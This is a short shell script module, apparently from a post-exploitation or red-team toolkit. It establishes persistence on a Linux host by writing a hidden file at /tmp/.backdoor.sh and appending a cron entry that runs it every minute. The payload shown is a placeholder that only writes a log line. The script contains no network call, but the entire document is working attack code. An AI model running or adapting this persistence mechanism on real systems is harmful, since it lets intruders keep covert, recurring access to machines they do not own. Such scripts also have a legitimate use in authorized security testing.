# Add a cron job for persistence
# Usage: load persistence/cron_job.sh

print_header "Persistence: Cron Job"

PAYLOAD="/tmp/.backdoor.sh"
CRON_CMD="* * * * * /bin/bash $PAYLOAD"

# Create a dummy payload if it doesn't exist
if [ ! -f "$PAYLOAD" ]; then
    echo "#!/bin/bash" > "$PAYLOAD"
    echo "echo 'Backdoor running' >> /tmp/backdoor.log" >> "$PAYLOAD"
    chmod +x "$PAYLOAD"
    print_success "Created dummy payload at $PAYLOAD"
fi

# Add to crontab
( crontab -l 2>/dev/null; echo "$CRON_CMD" ) | crontab -
print_success "Added cron job: $CRON_CMD"
